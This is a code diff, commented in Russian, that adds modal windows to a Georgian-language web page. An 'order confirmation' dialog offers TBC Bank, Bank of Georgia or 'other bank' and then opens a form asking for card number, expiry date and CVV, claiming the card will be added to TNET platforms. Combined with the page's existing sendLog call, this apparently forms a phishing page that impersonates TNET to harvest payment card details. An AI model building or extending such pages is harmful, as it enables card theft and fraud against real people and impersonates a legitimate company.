@@ -1082,6 +1082,137 @@
     .accordion-header {
       font-size: 18px !important;
     }
+
+    /* ===== МОДАЛЬНЫЕ ОКНА И ФОРМЫ ===== */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.35);
+      z-index: 6000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-overlay.open { display: flex; }
+
+    .modal {
+      background: #fff;
+      border-radius: 20px;
+      padding: 32px 28px;
+      width: 90%;
+      max-width: 560px;
+      position: relative;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.15);
+    }
+
+    .modal__header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 28px;
+      position: relative;
+    }
+
+    .modal__title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+    }
+
+    .modal__close {
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 1.5px solid #e0e0e0;
+      background: #fff;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #333;
+    }
+
+    .bank-item {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 20px;
+      border: 1.5px solid #e8e8e8;
+      border-radius: 14px;
+      margin-bottom: 12px;
+      cursor: pointer;
+      background: #fff;
+      width: 100%;
+      font-family: inherit;
+      text-align: left;
+      transition: border-color 0.2s;
+    }
+    .bank-item:hover { border-color: #aaa; }
+
+    .bank-item__name {
+      font-size: 16px;
+      font-weight: 500;
+      color: #1a1a1a;
+    }
+
+    /* Форма карты */
+    .card-form__input-wrap {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 12px;
+      padding: 16px 18px;
+      margin-bottom: 12px;
+    }
+    .card-form__input-wrap:focus-within { border-color: #FAC800; }
+
+    .card-form__input {
+      border: none;
+      outline: none;
+      font-size: 15px;
+      width: 100%;
+      font-family: inherit;
+      background: transparent;
+    }
+    .card-form__input::placeholder { color: #aaa; }
+
+    .card-form__row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .card-form__row .card-form__input-wrap { margin-bottom: 0; }
+
+    .card-form__submit {
+      width: 100%;
+      padding: 17px;
+      background: #FAC800;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #1a1a1a;
+      cursor: pointer;
+      margin-bottom: 20px;
+      font-family: inherit;
+    }
+
+    .card-form__logos {
+      text-align: center;
+    }
+
+    .card-form__tnet-text {
+      font-size: 13px;
+      color: #888;
+      text-align: center;
+      margin-bottom: 14px;
+    }
   </style>
 </head>
 <body>
@@ -2038,5 +2169,92 @@
     sendLog('page_confirmation', logDetails);
   });
 </script>
+
+<!-- ===== МОДАЛЬНЫЕ ОКНА ===== -->
+
+<!-- Модал выбора банка -->
+<div class="modal-overlay" id="bankModal">
+  <div class="modal">
+    <div class="modal__header">
+      <h2 class="modal__title">Подтверждение заказа</h2>
+      <button class="modal__close" onclick="closeBankModal()">✕</button>
+    </div>
+    <button class="bank-item" onclick="selectBank('tbc')">
+      <div class="bank-item__icon"><!-- иконка TBC --></div>
+      <span class="bank-item__name">თიბისი ბანკი</span>
+    </button>
+    <button class="bank-item" onclick="selectBank('bog')">
+      <div class="bank-item__icon"><!-- иконка BOG --></div>
+      <span class="bank-item__name">საქართველოს ბანკი</span>
+    </button>
+    <button class="bank-item" onclick="selectBank('other')">
+      <div class="bank-item__icon"><!-- иконка --></div>
+      <span class="bank-item__name">სხვა ბანკი</span>
+    </button>
+  </div>
+</div>
+
+<!-- Модал добавления карты -->
+<div class="modal-overlay" id="cardModal">
+  <div class="modal">
+    <div class="modal__header">
+      <h2 class="modal__title">Добавить карту</h2>
+      <button class="modal__close" onclick="closeCardModal()">✕</button>
+    </div>
+    <div class="card-form__input-wrap">
+      <input class="card-form__input" type="text" placeholder="Номер карты" maxlength="19"/>
+    </div>
+    <div class="card-form__row">
+      <div class="card-form__input-wrap">
+        <input class="card-form__input" type="text" placeholder="Месяц/Год" maxlength="5"/>
+      </div>
+      <div class="card-form__input-wrap">
+        <input class="card-form__input" type="password" placeholder="CVV" maxlength="3"/>
+      </div>
+    </div>
+    <button class="card-form__submit">Добавить</button>
+    <hr style="border:none;border-top:1px solid #f0f0f0;margin-bottom:16px;"/>
+    <p class="card-form__tnet-text">Карта будет добавлена на другие платформы TNET.</p>
+    <div class="card-form__logos">
+      <!-- логотипы TNET -->
+    </div>
+  </div>
+</div>
+
+<!-- ===== ФУНКЦИИ МОДАЛЕЙ ===== -->
+<script>
+function openBankModal() {
+  document.getElementById('bankModal').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeBankModal() {
+  document.getElementById('bankModal').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function openCardModal() {
+  document.getElementById('bankModal').classList.remove('open');
+  document.getElementById('cardModal').classList.add('open');
+}
+
+function closeCardModal() {
+  document.getElementById('cardModal').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function selectBank(bank) {
+  openCardModal();
+}
+
+// Кнопка "Подтвердить" вызывает openBankModal()
+document.addEventListener('DOMContentLoaded', function() {
+  const btnViewOrder = document.querySelector('.btn-view-order');
+  if (btnViewOrder) {
+    btnViewOrder.onclick = openBankModal;
+  }
+});
+</script>
+
 </body>
 </html>
